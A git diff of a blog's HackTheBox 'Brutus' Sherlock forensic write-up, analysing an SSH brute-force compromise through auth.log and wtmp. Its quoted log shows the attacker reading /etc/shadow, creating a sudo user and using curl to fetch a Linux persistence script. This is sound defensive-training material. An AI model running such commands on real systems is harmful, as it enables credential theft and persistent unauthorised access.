@@ -11,11 +11,11 @@ date: "2026-10-18 22:01:10 -04:00"
 image: "/assets/images/writeups/brutus/brutus.png"
 description: "An in-depth investigation of the Brutus sherlock from HackTheBox (HTB)"
 
-<!-- stuff -->
+#stuff
 summary: |
          In this Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.
 
-<!-- stuff -->
+#stuff
 overview_title: "Blind Analysis"
 overview:
   - |
@@ -31,14 +31,14 @@ overview:
   - |
     By typing `cat auth.log |grep 06:3|grep -v 65.2.161.68`, I was able to reduce a lot of noise by excluding matches that contained the attacker's IP with the help of `-v` (does the reverse of a normal grep, it excludes the things we search for). This might sound odd at first because "WHY ARE WE EXCLUDING THAT? ISN'T THAT THE MOST IMPORTANT THING?", but we already searched through the 200+ lines that contained the attacker's IP and the info we are looking for is not located there. So by excluding it, 200+ lines are ignored and we also get to see what they did, if anything, after they logged in as "cyberjunkie". We just have to scroll down to the 32nd minute of the hour which was when he logged in as root. The main things I found them do after they logged in as root were: **making a cyberjunkie group, user, adding the user to group sudo, printing out (output) /etc/shadow using cat, and running a .sh script**
 
-<!-- stuff -->
+#stuff
 side_notes:
   - |
     The timestamps in auth.log do not show the year so if we want to find it we have to utilize the wtmp file too, in there will look for the IP address of the attacker and get the year from there.
   - |
     Some of the code outputs have been simplified to make it fit better. Some of the output is omitted.
 
-<!-- stuff -->
+#stuff
 cards:
   card1:
     card_title: "question 01"
@@ -136,6 +136,6 @@ cards:
       [Mar 6 06:37:57] ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root
       [Mar 6 06:39:38] ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
 
-<!-- stuff -->
+#stuff
 ---
 {% include writeup-data.html %}
